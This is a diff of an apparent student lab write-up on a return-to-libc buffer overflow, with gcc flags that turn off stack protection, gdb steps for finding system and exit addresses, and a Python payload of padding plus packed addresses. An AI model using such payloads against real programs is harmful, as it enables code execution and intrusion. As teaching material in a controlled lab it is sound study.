@@ -92,9 +92,11 @@ nasm -f elf32 -o lab1.o lab1.asm
 ld -m elf_i386 -o lab1 lab1.o
 ```
 ```
-gcc lab1.c -o lab1.out -fno-stack-protector -mpreferred-stack-boundary=2
+gcc vullab1.c -o vullab1.out -fno-stack-protector -mpreferred-stack-boundary=2
 ```
-![Screenshot 2024-10-21 084953](https://github.com/user-attachments/assets/d1fea700-fd2a-411b-8109-65c0075384a8)
+![image](https://github.com/user-attachments/assets/82f4142d-6425-4873-82b9-7268a50f61c2)
+
+
 
 ### 3. Before doing this lab, we have to turn off ASLR (Address Space Layout Randomization)
 ```
@@ -133,7 +135,7 @@ r $(python -c "print(20*'a' + 'address of system' + 'address of exit' + 'address
 Use gdb for this c program
 
 ```
-gdb -q lab1.out
+gdb -q vullab1.out
 ```
 Start the code
 ```
@@ -146,7 +148,7 @@ print exit
 find /home/seed/seclabs/bof/midterm/file_copy
 ```
 
-![image](https://github.com/user-attachments/assets/30d8405e-cd3a-4476-a6fc-4f1a5c8a43f6)
+![image](https://github.com/user-attachments/assets/abc8086a-e280-44ef-afdc-60bedb4bca65)
 
 
 0xf7e50db0: Address of libc_system<br>
@@ -160,11 +162,14 @@ Before attack
 
 The attack start
 ```
-gdb -q lab1.out
+gdb -q vullab1.out
 ```
 ```
-r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x1a\xd9\xff\xff')")
+r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x14\xd9\xff\xff')")
 ```
+
+![image](https://github.com/user-attachments/assets/e9b06db2-1738-4674-a04d-526309f9d79d)
+
 
 After that, we use the code below to read file we have just copied
 ```
